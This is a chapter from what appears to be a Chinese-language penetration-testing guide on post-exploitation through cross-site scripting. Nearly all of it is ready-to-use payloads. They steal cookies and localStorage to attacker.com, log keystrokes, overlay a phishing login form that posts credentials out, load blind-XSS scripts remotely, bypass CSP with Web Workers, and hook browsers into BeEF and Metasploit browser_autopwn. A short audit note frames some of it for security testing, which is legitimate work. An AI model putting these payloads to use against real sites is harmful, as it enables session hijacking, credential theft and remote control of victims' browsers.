## 十、高级利用与后渗透（Cookie窃取/键盘记录/钓鱼/BeEF联动）

### 10.1 Cookie窃取与会话劫持
```javascript
// 基础Cookie窃取
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
<script>fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})</script>

// 绕过HttpOnly（无法直接读取HttpOnly Cookie，但可执行操作）
// 通过XSS执行CSRF、读取页面内容、操作页面

// 窃取localStorage/sessionStorage
<script>fetch('http://attacker.com/steal',{method:'POST',body:JSON.stringify(localStorage)})</script>

// 窃取CSRF token（从页面表单/meta标签）
document.querySelector('meta[name="csrf-token"]').content
```

### 10.2 键盘记录
```javascript
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/k?k=' + e.key + '&d=' + location.host;
}
</script>
// 进阶：配合focus监听记录密码框输入 + 提交前拦截
```

### 10.3 钓鱼/凭据窃取
```javascript
// 注入伪造登录表单（同源可信环境）
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>登录过期</h1><form action=http://attacker.com/phish method=post>用户名:<input name=u><br>密码:<input name=p type=password><br><button>登录</button></form></div>';
</script>
// 进阶：iframe内嵌攻击者页面诱导交互
// 进阶：篡改支付/转账请求（fetch拦截器，改金额/收款方）
```

### 10.4 Blind XSS（无回显XSS）
使用Blind XSS payload探测后台/日志/工单/客服页面：
```javascript
// 通用Blind XSS payload
"><script src=//attacker.com/xss.js></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'//attacker.com/xss.js\';document.body.appendChild(a)')
<img src=x onerror="s=document.createElement('script');s.src='//attacker.com/xss.js';document.body.appendChild(s)">
// xss.js内容：捕获document.cookie/页面源码/键盘输入 → 回传xss.ht平台
new Image().src='https://attacker.xss.ht/?c='+btoa(document.cookie)+'&u='+location.href;
```
**Blind XSS平台配合（与AI自动化配合见第十二章）：**
- XSS Hunter Express: https://github.com/mandatoryprogrammer/xsshunter-express
- ezXSS: https://github.com/ssl/ezXSS
- 自建接收端：`https://attacker.xss.ht` 记录所有回连，标记触发页面与上下文

### 10.5 PostMessage XSS
```javascript
// 不安全的postMessage监听
window.addEventListener('message', function(e) {
    eval(e.data);  // 危险：直接eval消息内容
}, false);

// 利用：在任意站点发送恶意消息（需确认目标handler是否校验origin）
<iframe src="https://target.com" onload="this.contentWindow.postMessage('alert(1)','*')">

// 实战审计：搜索addEventListener('message'，检查event.origin是否白名单校验
// payload思路：绕过origin校验（用子域名/兄弟域名/解析差异绕过宽松白名单）
```

### 10.6 Web Worker绕过CSP
```javascript
// Worker可绕过页面CSP，从其他源加载脚本
var w = new Worker('http://attacker.com/worker.js');
// worker.js: importScripts('http://attacker.com/x.js');

// 或Blob Worker
var b = new Blob(['importScripts("http://attacker.com/x.js")'],{type:'application/javascript'});
var u = URL.createObjectURL(b);
new Worker(u);
```

### 10.7 BeEF浏览器后渗透（C2化XSS）
```html
<!-- BeEF hook脚本（将XSS升级为C2通道） -->
<script src=http://attacker.com:3000/hook.js></script>
```
**BeEF实战流程：**
```
1. 启动：beef-xss（默认端口3000，UI: http://127.0.0.1:3000/ui/panel）
2. 交付hook：注入XSS点或钓鱼邮件/水坑页面
3. 浏览器指纹：OS/浏览器版本/分辨率/已装插件
4. 信息收集模块：Cookie获取、页面抓取、表单值捕获、剪贴板监听
5. 网络侦察：内网IP探测、端口扫描、子域名探测（借受害者浏览器）
6. 社工模块：假更新弹窗、HTML5钓鱼、权限请求
7. 持久化：iframe隧道、持久化hook（重新加载后重连）
8. Metasploit联动：browser_autopwn 针对受害者浏览器版本推送exploit
   msf> use exploit/multi/browser/browser_autopwn
```
**BeEF + Metasploit browser_autopwn链**：XSS hook → 指纹识别浏览器版本 → 匹配Metasploit浏览器漏洞模块 → RCE（2026年主流浏览器漏洞利用n-day仍频繁，Chrome/Edge/Firefox历史CVE：CVE-2021-1765等）。
**审计视角**：hook.js即"反弹shell"，一旦BeEF能hook即证明XSS可完全控制浏览器会话，报告评级应直接拉高。

### 10.8 浏览器劫持/BeEF框架
```html
<!-- BeEF hook脚本 -->
<script src=http://attacker.com:3000/hook.js></script>
<!-- BeEF功能：浏览器信息收集、内网扫描、端口扫描、键盘记录、钓鱼、社工、Metasploit模块联动 -->
```

